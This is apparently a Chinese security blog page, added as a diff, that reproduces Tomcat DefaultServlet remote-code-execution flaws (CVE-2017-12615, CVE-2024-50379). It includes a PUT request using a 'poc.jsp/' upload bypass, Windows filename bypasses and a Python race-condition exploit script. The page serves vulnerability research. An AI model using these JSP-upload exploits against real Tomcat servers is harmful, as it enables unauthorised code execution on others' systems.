@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Tomcat中DefaultServlet漏洞复现 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="复现了Tomcat中关于DefaultServlet的一系列RCE漏洞。">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="Tomcat中DefaultServlet漏洞复现">
+  <meta property="og:description" content="复现了Tomcat中关于DefaultServlet的一系列RCE漏洞。">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-04T10:48:20+00:00">
+    <meta property="article:modified_time" content="2025-04-04T10:48:20+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Tomcat中DefaultServlet漏洞复现">
+<meta name="twitter:description" content="复现了Tomcat中关于DefaultServlet的一系列RCE漏洞。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Tomcat中DefaultServlet漏洞复现",
+      "item": "https://zoiltin.github.io/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Tomcat中DefaultServlet漏洞复现",
+  "name": "Tomcat中DefaultServlet漏洞复现",
+  "description": "复现了Tomcat中关于DefaultServlet的一系列RCE漏洞。",
+  "keywords": [
+    
+  ],
+  "articleBody": "本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\nCVE-2017-12615 环境搭建 这里用Docker搭建环境。Dockerfile：\nFROM tomcat:8.5.19-alpine\rCOPY context.xml web.xml /usr/local/tomcat/conf/\rCOPY debug.sh catalina.sh /usr/local/tomcat/bin/\rWORKDIR /usr/local/tomcat/bin/\rRUN chmod +x debug.sh \u0026\u0026 \\\rchmod +x catalina.sh\rCMD [\"./debug.sh\"] debug.sh代码如下：\n#!/bin/bash ./startup.sh sleep 1000000 覆盖catalina.sh，向文件开头加入以下代码，用于debug。\nexport JAVA_OPTS='-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005' 在web.xml中配置DefaultServlet的开启：\ndefalut org.apache.catalina.servlets.DefaultServlet debug 0 readonly false 1 defalut / 容器其中之后将lib目录下的文件复制出来导入IDEA即可：\ndocker cp tomcat:/usr/local/tomcat/lib ./ docker run如果句柄不够需要加上以下参数：\n--ulimit nofile=65535:65535 漏洞分析 Tomcat爆出过多个关于DefaultServlet的漏洞。它是Tomcat中自带的一个Servlet，但默认不开启，位于/lib/catalina.jar!/org/apache/catalina/servlets/下。\nDefaultServlet定义了doPut方法：\nprotected void doPut(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { if (this.readOnly) { resp.sendError(403); } else { String path = this.getRelativePath(req); WebResource resource = this.resources.getResource(path); Range range = this.parseContentRange(req, resp); InputStream resourceInputStream = null; try { if (range != null) { File contentFile = this.executePartialPut(req, range, path); resourceInputStream = new FileInputStream(contentFile); } else { resourceInputStream = req.getInputStream(); } if (this.resources.write(path, (InputStream)resourceInputStream, true)) { if (resource.exists()) { resp.setStatus(204); } else { resp.setStatus(201); } } else { resp.sendError(409); } } finally { if (resourceInputStream != null) { try { ((InputStream)resourceInputStream).close(); } catch (IOException var13) { } } } } } 当this.readOnly为false时才可以写文件，对应web.xml里配置的参数。\n从request body中获取输入流，文件名是webapps/ROOT拼接上URL path。\n发送以下PUT数据包： 最终文件路径就是webapps/ROOT/test.txt。\n但无法直接写入jsp文件。查看web.xml发现默认还有一个JSP的servlet：\njsp org.apache.jasper.servlet.JspServlet fork false xpoweredBy false 3 jsp *.jsp *.jspx 对于path以jsp或jspx结尾的请求会交由JspServlet处理。\n这里可以用exp.jsp/绕过。这个path依然是进入DefaultServlet，而在后续的DirResourceSet#write方法会处理成exp.jsp。\n这样就可以上传jsp文件了。\nPUT /poc.jsp/ HTTP/1.1\rConnection: close\rContent-Length: 6\rasdasd 其他绕过方式：\nwindows会去除文件名结尾的空格 windows下exp.jsp::$DATA CVE-2024-50379 9.0.0.M1 ≤ version ≤ 9.0.97\n10.1.0-M1 ≤ version ≤ 10.1.33\n11.0.0-M1 ≤ version ≤ 11.0.1\n环境搭建 环境用的是tomcat windows 9.0.1，和上面一样配置好web.xml，在bin目录下写一个debug.bat文件：\nset JPDA_ADDRESS=5005 set JPDA_TRANSPORT=dt_socket set CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005 startup 运行这个文件即可debug。\n漏洞分析 当访问以.jsp或.jspx结尾的文件时会进入JspServlet处理，会尝试查找相应的JSP文件。最终会调用到org.apache.catalina.webresources.AbstractFileResourceSet#file方法，堆栈如下：\norg.apache.catalina.webresources.AbstractFileResourceSet#file\rorg.apache.catalina.webresources.DirResourceSet#getResource\rorg.apache.catalina.webresources.StandardRoot#getResourceInternal\rorg.apache.catalina.webresources.CachedResource#validateResource\rorg.apache.catalina.webresources.Cache#getResource\rorg.apache.catalina.webresources.StandardRoot#getResource\rorg.apache.catalina.webresources.StandardRoot#getResource\rorg.apache.catalina.core.ApplicationContext#getResource\rorg.apache.catalina.core.ApplicationContextFacade#getResource\rorg.apache.jasper.servlet.JspServlet#serviceJspFile\rorg.apache.jasper.servlet.JspServlet#service\rjavax.servlet.http.HttpServlet#service 其代码如下：\nprotected final File file(String name, boolean mustExist) { if (name.equals(\"/\")) { name = \"\"; } File file = new File(this.fileBase, name); if (name.endsWith(\"/\") \u0026\u0026 file.isFile()) { return null; } else if (mustExist \u0026\u0026 !file.canRead()) { return null; } else if (this.getRoot().getAllowLinking()) { return file; } else if (JrePlatform.IS_WINDOWS \u0026\u0026 this.isInvalidWindowsFilename(name)) { return null; } else { String canPath = null; try { canPath = file.getCanonicalPath(); } catch (IOException var6) { } if (canPath != null \u0026\u0026 canPath.startsWith(this.canonicalBase)) { String absPath = this.normalize(file.getAbsolutePath()); if (this.absoluteBase.length() \u003e absPath.length()) { return null; } else { absPath = absPath.substring(this.absoluteBase.length()); canPath = canPath.substring(this.canonicalBase.length()); if (canPath.length() \u003e 0) { canPath = this.normalize(canPath); } return !canPath.equals(absPath) ? null : file; } } else { return null; } } } 假如发送如下数据包：\nGET /evil.jsp HTTP/1.1\rConnection: close 这里获取了两个path：absPath和canPath，absPath是URL中的PATH也就是/evil.jsp。\n而canPath比较特殊，如果webapps下有evil.JSP，则canPath的值为/evil.JSP，因为在windows不区分大小写。但此时因为canPath与absPath不同，函数会返回null。\nreturn之后，回到org.apache.catalina.webresources.DirResourceSet#getResource方法，代码如下：\npublic WebResource getResource(String path) { this.checkPath(path); String webAppMount = this.getWebAppMount(); WebResourceRoot root = this.getRoot(); if (path.startsWith(webAppMount)) { File f = this.file(path.substring(webAppMount.length()), false); if (f == null) { return new EmptyResource(root, path); } else if (!f.exists()) { return new EmptyResource(root, path, f); } else { if (f.isDirectory() \u0026\u0026 path.charAt(path.length() - 1) != '/') { path = path + '/'; } return new FileResource(root, path, f, this.isReadOnly(), this.getManifest()); } } else { return new EmptyResource(root, path); } } 此时f = null，会return一个EmptyResource，最终返回404。\n但如果webapps下没有evil.JSP(无论大小写)。那么canPath的值会跟absPath相同。 此时file方法会将这个指向/evil.jsp的File对象返回。\n紧接着getResource方法会检查其是否存在： 此处的f.exists()在windows写也不区分大小写。\n所以这里存在一个竞争空间，大前提是目前无法直接上传jsp和jspx文件，但JspServlet只接受这两种后缀，所以想通过条件竞争使得访问/evil.jsp时可以执行/evil.JSP文件\n如果在file方法执行时evil.JSP不存在，而到了getResource方法里写入了evil.JSP，那么就可以通过JspServlet执行evil.JSP文件了。\nPOC：\nimport requests import string import random import threading url = 'http://' payload = ''' POC '''.strip() def generate_random_string(length): characters = string.ascii_lowercase + string.digits return ''.join(random.choices(characters, k=length)) def put_file(filename : str): requests.put(url=url + '/' + filename + '.JSP', data=payload) def get_file(filename : str): res = requests.get(url=url + '/' + filename + '.jsp') if res.status_code != 404: print() print(\"[+] exploit success\") if __name__ == \"__main__\": filename = generate_random_string(8) get_thread = threading.Thread(target=get_file, args=[filename]) put_thread = threading.Thread(target=put_file, args=[filename]) get_thread.start() put_thread.start() get_thread.join() put_thread.join() 多试几次就能成功。但这个过程会上传很多文件：\n不过如果给DefaultServlet配置了readOnly为false的话，那么就可以用DELETE请求删除文件。详见WHOAMI师傅的blog\nCVE-2025-24813 9.0.0.M1 \u003c= tomcat \u003c= 9.0.98\n10.1.0-M1 \u003c= tomcat \u003c= 10.1.34\n11.0.0-M1 \u003c= tomcat \u003c= 11.0.2\n环境搭建 环境依然是tomcat windows 9.0.1，开启DefaultServlet，和上面一样。\n除此之外放一个commons-collections3.2.1的jar包到lib目录下。\n还需要配置context.xml开启SESSION持久化：\n",
+  "wordCount" : "857",
+  "inLanguage": "en",
+  "datePublished": "2025-04-04T10:48:20Z",
+  "dateModified": "2025-04-04T10:48:20Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Tomcat中DefaultServlet漏洞复现
+    </h1>
+    <div class="post-description">
+      复现了Tomcat中关于DefaultServlet的一系列RCE漏洞。
+    </div>
+    <div class="post-meta"><span title='2025-04-04 10:48:20 +0000 UTC'>April 4, 2025</span>&nbsp;·&nbsp;5 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#cve-2017-12615" aria-label="CVE-2017-12615">CVE-2017-12615</a><ul>
+                        
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="环境搭建">环境搭建</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a></li></ul>
+                </li>
+                <li>
+                    <a href="#cve-2024-50379" aria-label="CVE-2024-50379">CVE-2024-50379</a><ul>
+                        
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba-1" aria-label="环境搭建">环境搭建</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" aria-label="漏洞分析">漏洞分析</a></li></ul>
+                </li>
+                <li>
+                    <a href="#cve-2025-24813" aria-label="CVE-2025-24813">CVE-2025-24813</a><ul>
+                        
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba-2" aria-label="环境搭建">环境搭建</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-2" aria-label="漏洞分析">漏洞分析</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。</strong></p>
+<h1 id="cve-2017-12615">CVE-2017-12615<a hidden class="anchor" aria-hidden="true" href="#cve-2017-12615">#</a></h1>
+<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
+<p>这里用Docker搭建环境。Dockerfile：</p>
+<pre tabindex="0"><code>FROM tomcat:8.5.19-alpine
+
+COPY context.xml web.xml /usr/local/tomcat/conf/
+
+COPY debug.sh catalina.sh /usr/local/tomcat/bin/
+
+WORKDIR /usr/local/tomcat/bin/
+
+RUN chmod +x debug.sh &amp;&amp; \
+    chmod +x catalina.sh
+
+CMD [&#34;./debug.sh&#34;]   
+</code></pre><p><code>debug.sh</code>代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>./startup.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">1000000</span>     
+</span></span></code></pre></div><p>覆盖<code>catalina.sh</code>，向文件开头加入以下代码，用于debug。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>export JAVA_OPTS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&#39;</span>
+</span></span></code></pre></div><p>在<code>web.xml</code>中配置DefaultServlet的开启：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>defalut<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-class&gt;</span>org.apache.catalina.servlets.DefaultServlet<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;init-param&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-name&gt;</span>debug<span style="color:#f92672">&lt;/param-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-value&gt;</span>0<span style="color:#f92672">&lt;/param-value&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/init-param&gt;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;init-param&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-name&gt;</span>readonly<span style="color:#f92672">&lt;/param-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-value&gt;</span>false<span style="color:#f92672">&lt;/param-value&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/init-param&gt;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;load-on-startup&gt;</span>1<span style="color:#f92672">&lt;/load-on-startup&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet&gt;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>defalut<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;&lt;/web-app&gt;</span>
+</span></span></code></pre></div><p>容器其中之后将lib目录下的文件复制出来导入IDEA即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker cp tomcat:/usr/local/tomcat/lib ./
+</span></span></code></pre></div><p>docker run如果句柄不够需要加上以下参数：</p>
+<pre tabindex="0"><code>--ulimit nofile=65535:65535
+</code></pre><h2 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h2>
+<p>Tomcat爆出过多个关于DefaultServlet的漏洞。它是Tomcat中自带的一个Servlet，但默认不开启，位于<code>/lib/catalina.jar!/org/apache/catalina/servlets/</code>下。</p>
+<p><code>DefaultServlet</code>定义了<code>doPut</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doPut</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">readOnly</span>) {
+</span></span><span style="display:flex;"><span>        resp.<span style="color:#a6e22e">sendError</span>(403);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        String path <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRelativePath</span>(req);
+</span></span><span style="display:flex;"><span>        WebResource resource <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resources</span>.<span style="color:#a6e22e">getResource</span>(path);
+</span></span><span style="display:flex;"><span>        Range range <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parseContentRange</span>(req, resp);
+</span></span><span style="display:flex;"><span>        InputStream resourceInputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (range <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                File contentFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">executePartialPut</span>(req, range, path);
+</span></span><span style="display:flex;"><span>                resourceInputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(contentFile);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                resourceInputStream <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resources</span>.<span style="color:#a6e22e">write</span>(path, (InputStream)resourceInputStream, <span style="color:#66d9ef">true</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (resource.<span style="color:#a6e22e">exists</span>()) {
+</span></span><span style="display:flex;"><span>                    resp.<span style="color:#a6e22e">setStatus</span>(204);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    resp.<span style="color:#a6e22e">setStatus</span>(201);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                resp.<span style="color:#a6e22e">sendError</span>(409);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (resourceInputStream <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                    ((InputStream)resourceInputStream).<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> (IOException var13) {
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>当<code>this.readOnly</code>为false时才可以写文件，对应<code>web.xml</code>里配置的参数。</p>
+<p>从request body中获取输入流，文件名是<code>webapps/ROOT</code>拼接上URL path。</p>
+<p>发送以下PUT数据包：
+<img alt="1" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.png">
+最终文件路径就是<code>webapps/ROOT/test.txt</code>。</p>
+<p>但无法直接写入jsp文件。查看web.xml发现默认还有一个JSP的servlet：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>jsp<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-class&gt;</span>org.apache.jasper.servlet.JspServlet<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;init-param&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-name&gt;</span>fork<span style="color:#f92672">&lt;/param-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-value&gt;</span>false<span style="color:#f92672">&lt;/param-value&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/init-param&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;init-param&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-name&gt;</span>xpoweredBy<span style="color:#f92672">&lt;/param-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-value&gt;</span>false<span style="color:#f92672">&lt;/param-value&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/init-param&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;load-on-startup&gt;</span>3<span style="color:#f92672">&lt;/load-on-startup&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>jsp<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>*.jsp<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>*.jspx<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span></code></pre></div><p>对于path以<code>jsp</code>或<code>jspx</code>结尾的请求会交由<code>JspServlet</code>处理。</p>
+<p>这里可以用<code>exp.jsp/</code>绕过。这个path依然是进入<code>DefaultServlet</code>，而在后续的<code>DirResourceSet#write</code>方法会处理成<code>exp.jsp</code>。</p>
+<p><img alt="2" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/2.png"></p>
+<p>这样就可以上传jsp文件了。</p>
+<pre tabindex="0"><code>PUT /poc.jsp/ HTTP/1.1
+Connection: close
+Content-Length: 6
+
+asdasd
+</code></pre><p>其他绕过方式：</p>
+<ul>
+<li>windows会去除文件名结尾的空格</li>
+<li>windows下<code>exp.jsp::$DATA</code></li>
+</ul>
+<h1 id="cve-2024-50379">CVE-2024-50379<a hidden class="anchor" aria-hidden="true" href="#cve-2024-50379">#</a></h1>
+<blockquote>
+<p>9.0.0.M1 ≤ version ≤ 9.0.97</p>
+<p>10.1.0-M1 ≤ version ≤ 10.1.33</p>
+<p>11.0.0-M1 ≤ version ≤ 11.0.1</p>
+</blockquote>
+<h2 id="环境搭建-1">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建-1">#</a></h2>
+<p>环境用的是tomcat windows 9.0.1，和上面一样配置好<code>web.xml</code>，在<code>bin</code>目录下写一个<code>debug.bat</code>文件：</p>
